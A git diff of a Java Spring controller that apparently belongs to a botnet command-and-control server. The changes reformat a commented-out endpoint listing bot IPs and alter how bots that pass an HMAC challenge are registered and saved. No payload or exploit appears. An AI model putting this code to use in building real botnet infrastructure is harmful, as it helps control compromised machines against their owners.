@@ -58,19 +58,20 @@ public class CommandController {
 		return response;
 
 	}
-//TODO
-//	@RequestMapping(value = "/BotNet", method = RequestMethod.GET)
-//	@ResponseBody
-//	public List<IP> getAllBotNet(HttpServletResponse error) throws IOException {
-//		List<IP> response = new ArrayList<IP>();
-//
-//		if (engineBot.isCommandandconquerStatus()) {
-//			response = networkService.getBotIps().getIPList();
-//		} else {
-//			error.sendError(HttpStatus.SC_NOT_FOUND);
-//		}
-//		return response;
-//	}
+	// TODO
+	// @RequestMapping(value = "/BotNet", method = RequestMethod.GET)
+	// @ResponseBody
+	// public List<IP> getAllBotNet(HttpServletResponse error) throws
+	// IOException {
+	// List<IP> response = new ArrayList<IP>();
+	//
+	// if (engineBot.isCommandandconquerStatus()) {
+	// response = networkService.getBotIps().getIPList();
+	// } else {
+	// error.sendError(HttpStatus.SC_NOT_FOUND);
+	// }
+	// return response;
+	// }
 
 	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
 
@@ -97,10 +98,8 @@ public class CommandController {
 	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
 			HttpServletRequest request) throws IOException {
 		String response = "";
-		
 		String idBot = objects.get(0).toString();
-		String Mac=objects.get(1).toString();
-		String hashMac=objects.get(2).toString();
+		String hashMac=objects.get(7).toString();
 		
 		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
 		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
@@ -113,7 +112,8 @@ public class CommandController {
 				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 					response = "Challenge OK";
 					//botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),objects.get(3).toString(), objects.get(2).toString()));
-					botService.getBotRepository().save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(), Mac, null));
+					Bot bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(), objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),objects.get(6).toString());
+					botService.getBotRepository().save(bot);
 					//TODO DA decidere send some peers
 				}
 
@@ -128,18 +128,16 @@ public class CommandController {
 
 	/////////////////////////////////////////////////////////////////////////
 
-
-
 	@RequestMapping(value = "/prova", method = RequestMethod.GET)
 	@ResponseBody
 	public String prova() {
 
 		return "";
 	}
-	
-//	@RequestMapping(value = "/list", method = RequestMethod.GET)
-//	public String list() {
-//		return "userCommand";
-//	}
-//	
+
+	// @RequestMapping(value = "/list", method = RequestMethod.GET)
+	// public String list() {
+	// return "userCommand";
+	// }
+	//
 }
